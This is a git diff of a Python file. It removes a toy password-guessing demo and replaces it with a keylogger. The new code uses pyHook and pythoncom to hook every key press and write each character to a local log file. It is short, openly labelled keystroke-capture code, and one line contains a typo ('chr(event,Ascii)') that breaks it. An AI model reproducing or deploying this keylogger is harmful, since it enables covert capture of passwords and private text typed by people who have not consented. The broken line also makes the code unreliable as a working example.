@@ -1,33 +1,14 @@
-import random
-import time
+import pyHook, pythoncom, sys, logging
 
-password = ""
-attempted_password = ""
-list_of_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()<>"
-for letter in range(0, random.randint(10, 25)):
-    password += list_of_chars[random.randint(0, 20)]
+file_log = "/Users/Zach/Desktop/pythonprojects/log.txt"
 
+def OnKeyboardEvent(event):
+	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
+	chr(event,Ascii)
+	logging.log(10,chr(event.Ascii))
+	return True
 
-def timeit(func):
-    def wrapper(*args, **kwargs):
-        start = time.time()
-        result = func(*args, **kwargs)
-        print "The function {.__name__} took {:.15f} seconds to finish.".format(func, time.time() - start)
-        return result
-    return wrapper
-
-
-@timeit
-def solve_password(word):
-    global attempted_password
-    for character in word:
-        for entry in list_of_chars:
-            if character == entry:
-                attempted_password += character
-                print(attempted_password)
-                continue
-    return attempted_password
-
-print "The password: {0:}\nLength of password was: {1:}\nIs correct? : {2:}".format(solve_password(password),
-                                                                                    len(password),
-                                                                                    attempted_password == password)
+hooks_manager = pyHook.HookManager()
+hooks_manager.KeyDown = OnKeyboardEvent
+hooks_manager.HookKeyboard()
+pythoncom.PumpMessages()
